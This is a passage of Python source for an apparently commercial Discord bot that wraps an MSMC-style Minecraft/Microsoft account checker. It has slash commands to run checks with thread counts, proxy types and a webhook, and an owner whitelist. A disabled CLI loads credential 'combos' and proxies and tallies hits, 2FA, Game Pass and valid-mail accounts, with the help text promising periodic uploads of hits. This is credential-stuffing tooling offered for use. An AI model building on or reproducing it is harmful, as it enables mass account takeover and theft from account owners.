            color=0xFF4444,
            timestamp=datetime.now()
        )
        embed.set_footer(text="Vex Development Premium • Access Control", icon_url="https://i.ibb.co/yGmtWXV/file-00000000d0707209b72dd557897448e2.png")
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    
    await interaction.response.defer()
    
    active_sessions = [s for s in active_checkers.values() if s.is_running]
    
    if not active_sessions:
        await interaction.followup.send("<a:emoji_9:1450903287606804632> No active checker sessions.")
        return
    
    embed = discord.Embed(
        title="<a:stolen_emoji_blaze:1450914181292359692> **All Active Sessions**",
        description="# Global Session Monitor",
        color=0x9B59B6,
        timestamp=datetime.now()
    )
    embed.set_footer(text="Vex Development Premium • Global Monitor", icon_url="https://i.ibb.co/yGmtWXV/file-00000000d0707209b72dd557897448e2.png")
    embed.set_thumbnail(url="https://i.ibb.co/yGmtWXV/file-00000000d0707209b72dd557897448e2.png")
    
    for session in active_sessions:
        user = session.ctx.author
        progress = f"{session.stats['checked']}/{session.stats['total']} ({session.stats['checked']/session.stats['total']*100:.1f}%)"
        embed.add_field(
            name=f"{user.name} - {session.session_id[:8]}...",
            value=f"Progress: {progress}\nHits: {session.stats['hits']}\nThreads: {session.threads}",
            inline=True
        )
    
    await interaction.followup.send(embed=embed)

@bot.tree.command(name="help", description="Show all available commands")
async def help_command(interaction: discord.Interaction):
    """Show help message with all commands"""
    is_owner = OWNER_ID and interaction.user.id == OWNER_ID
    is_auth = is_authorized(interaction.user.id)
    
    embed = discord.Embed(
        title="<a:stolen_emoji_blaze:1450909317434835108> Bot Commands Help",
        description="Complete list of available commands",
        color=0x00FFFF,
        timestamp=datetime.now()
    )
    
    if is_auth:
        embed.add_field(
            name="<a:stolen_emoji_blaze:1450911473252569260> Checker Commands",
            value="""```
/check [threads] [proxy_type] [webhook_url]
  Start checking Minecraft accounts
  
/stop [session_id]
  Stop a checking session
  
/status [session_id]
  Check status of running sessions
  
/list
  List all active sessions
```""",
            inline=False
        )
    
    if is_owner:
        embed.add_field(
            name="<a:stolen_emoji_blaze:1450927008132366427> Owner Commands",
            value="""```
/grant [user_id]
  Grant access to a user
  
/revoke [user_id]
  Revoke access from a user
  
/whitelist
  View all authorized users
  
/botstats
  View bot statistics
```""",
            inline=False
        )
    
    embed.add_field(
        name="<a:stolen_emoji_blaze:1450915480452731034> Proxy Types",
        value="""```
1 or http    - HTTP/HTTPS proxies
2 or socks4  - SOCKS4 proxies
3 or socks5  - SOCKS5 proxies
4 or none    - No proxies
5 or auto    - Auto scrape proxies
```""",
        inline=False
    )
    
    embed.add_field(
        name="<a:stolen_emoji_blaze:1450914724769173665> Auto Features",
        value="""```yaml
• Banned hits upload: Every 10 minutes
• Unbanned hits upload: Every 5 minutes
• 24/7 Background processing
• Automatic queue management
```""",
        inline=False
    )
    
    embed.set_footer(
        text=f"User: {interaction.user.name} | Access: {'<a:stolen_emoji_blaze:1450912362327572602> Owner' if is_owner else '<a:stolen_emoji_blaze:1450912362327572602> Authorized' if is_auth else '<a:emoji_9:1450903287606804632> Unauthorized'}",
        icon_url=interaction.user.avatar.url if interaction.user.avatar else None
    )
    
    await interaction.response.send_message(embed=embed, ephemeral=True)

def load_authorized_users():
    """Load authorized users from file"""
    global AUTHORIZED_USERS
    try:
        if os.path.exists('authorized_users.txt'):
            with open('authorized_users.txt', 'r') as f:
                for line in f:
                    try:
                        user_id = int(line.strip())
                        AUTHORIZED_USERS.add(user_id)
                    except ValueError:
                        continue
            print(f"<a:stolen_emoji_blaze:1450912362327572602> Loaded {len(AUTHORIZED_USERS)} authorized users")
        else:
            # Create empty file
            with open('authorized_users.txt', 'w') as f:
                pass
            print("<a:stolen_emoji_blaze:1450912362327572602> Created authorized_users.txt file")
    except Exception as e:
        print(f"<a:emoji_9:1450903287606804632> Error loading authorized users: {e}")

def setup_checker():
    """Initialize the checker configuration"""
    try:
        loadconfig()
        load_authorized_users()
        print("<a:stolen_emoji_blaze:1450912362327572602> Checker configuration loaded")
    except Exception as e:
        print(f"<a:emoji_9:1450903287606804632> Error loading config: {e}")

# Bot startup
@bot.event
async def on_connect():
    setup_checker()

def run_discord_bot(token):
    """Start the Discord bot"""
    try:
        bot.run(token)
    except Exception as e:
        print(f"❌ Failed to start bot: {e}")

# Run Discord bot by default
if __name__ == "__main__":
    import sys
    
    # Try to get token from environment variable
    load_dotenv()
    token = os.getenv('BOT_TOKEN')
    
    if not token:
        print("❌ No BOT_TOKEN provided")
        print("💡 Set the BOT_TOKEN environment variable or secret")
        sys.exit(1)
    
    print("🚀 Starting Discord bot...")
    run_discord_bot(token)

    if False:
        # Run original CLI version
        def Main():
            global proxytype, screen
            utils.set_title("VaultCore")
            os.system('clear')
            try:
                loadconfig()
            except:
                print(Fore.RED+"There was an error loading the config. Perhaps you're using an older config? If so please delete the old config and reopen MSMC.")
                input()
                exit()
            print(logo)
            try:
                print(Fore.RED+"(For Best Check Use Only 5-10 Threads)")
                thread = int(input(Fore.LIGHTBLUE_EX+"Threads: "))
            except:
                print(Fore.LIGHTRED_EX+"Must be a number.") 
                time.sleep(2)
                Main()
            print(Fore.LIGHTBLUE_EX+"Proxy Type: [1] Http\s - [2] Socks4 - [3] Socks5 - [4] None - [5] Auto Scraper")
            proxytype = repr(input().strip())
            cleaned = int(proxytype.replace("'", ""))
            if cleaned not in range(1, 6):
                print(Fore.RED+f"Invalid Proxy Type [{cleaned}]")
                time.sleep(2)
                Main()
            print(Fore.LIGHTBLUE_EX+"Screen: [1] CUI - [2] Log")
            screen = repr(input().strip())
            print(Fore.LIGHTBLUE_EX+"Select your combos")
            Load(filedialog.askopenfile().name)
            if proxytype != "'4'" and proxytype != "'5'":
                print(Fore.LIGHTBLUE_EX+"Select your proxies")
                Proxys(filedialog.askopenfile().name)
            if config.get('proxylessban') == False and config.get('hypixelban') is True:
                print(Fore.LIGHTBLUE_EX+"Select your SOCKS5 Ban Checking Proxies.")
                banproxyload(filedialog.askopenfile().name)
            if proxytype =="'5'":
                print(Fore.LIGHTGREEN_EX+"Scraping Proxies Please Wait.")
                threading.Thread(target=get_proxies).start()
                while len(proxylist) == 0: 
                    time.sleep(1)
            if not os.path.exists("results"): os.makedirs("results/")
            if not os.path.exists('results/'+fname): os.makedirs('results/'+fname)
            if screen == "'1'": 
                def cuiscreen():
                    global cpm, cpm1
                    os.system('clear')
                    cmp1 = cpm
                    cpm = 0
                    print(Fore.LIGHTMAGENTA_EX + logo)
                    print(Fore.LIGHTMAGENTA_EX + f"                                          [{checked}/{len(Combos)}] Checked")
                    print(Fore.LIGHTMAGENTA_EX + f"                                          [{hits}] Hits")
                    print(Fore.LIGHTMAGENTA_EX + f"                                          [{bad}] Bad")
                    print(Fore.LIGHTMAGENTA_EX + f"                                          [{sfa}] SFA")
                    print(Fore.LIGHTMAGENTA_EX + f"                                          [{mfa}] MFA")
                    print(Fore.LIGHTMAGENTA_EX + f"                                          [{twofa}] 2FA")
                    print(Fore.LIGHTMAGENTA_EX + f"                                          [{xgp}] Xbox Game Pass")
                    print(Fore.LIGHTMAGENTA_EX + f"                                          [{xgpu}] Xbox Game Pass Ultimate")
                    print(Fore.LIGHTMAGENTA_EX + f"                                          [{other}] Other")
                    print(Fore.LIGHTMAGENTA_EX + f"                                          [{vm}] Valid Mail")
                    print(Fore.LIGHTMAGENTA_EX + f"                                          [{retries}] Retries")
                    print(Fore.LIGHTMAGENTA_EX + f"                                          [{errors}] Errors")
                    utils.set_title(f"Warden Cloud  | Checked: {checked}/{len(Combos)}  -  Hits: {hits}  -  Bad: {bad}  -  2FA: {twofa}  -  SFA: {sfa}  -  MFA: {mfa}  -  Xbox Game Pass: {xgp}  -  Xbox Game Pass Ultimate: {xgpu}  -  Valid Mail: {vm}  -  Other: {other}  -  Cpm: {cmp1*60}  -  Retries: {retries}  -  Errors: {errors}")
                    time.sleep(1)
                    threading.Thread(target=cuiscreen).start()
                cuiscreen()
            elif screen == "'2'": 
                def logscreen():
                    global cpm, cpm1
                    cmp1 = cpm
                    cpm = 0
                    utils.set_title(f"Warden Cloud | Checked: {checked}/{len(Combos)}  -  Hits: {hits}  -  Bad: {bad}  -  2FA: {twofa}  -  SFA: {sfa}  -  MFA: {mfa}  -  Xbox Game Pass: {xgp}  -  Xbox Game Pass Ultimate: {xgpu}  -  Valid Mail: {vm}  -  Other: {other}  -  Cpm: {cmp1*60}  -  Retries: {retries}  -  Errors: {errors}")
                    time.sleep(1)
                    threading.Thread(target=logscreen).start()
                logscreen()
            with concurrent.futures.ThreadPoolExecutor(max_workers=thread) as executor:
                futures = [executor.submit(Checker, combo) for combo in Combos]
                concurrent.futures.wait(futures)
            
            def finishedscreen():
                global hits, bad, sfa, mfa, twofa, xgp, xgpu, other, vm, retries, errors, fname, unbanned, banned_count
                print(logo)
                print()
                print(Fore.LIGHTGREEN_EX+"Finished Checking!")
                print()
                print("Hits: "+str(hits))
                print("Bad: "+str(bad))
                print("SFA: "+str(sfa))
                print("MFA: "+str(mfa))
                print("2FA: "+str(twofa))
                print("Xbox Game Pass: "+str(xgp))
                print("Xbox Game Pass Ultimate: "+str(xgpu))
                print("Other: "+str(other))
                print("Valid Mail: "+str(vm))
                print("Unbanned: "+str(unbanned))
                print("Banned: "+str(banned_count))
                print(Fore.LIGHTRED_EX+"Press any key to exit.")
                input()
                sys.exit()
            finishedscreen()
        
        Main()
        input()
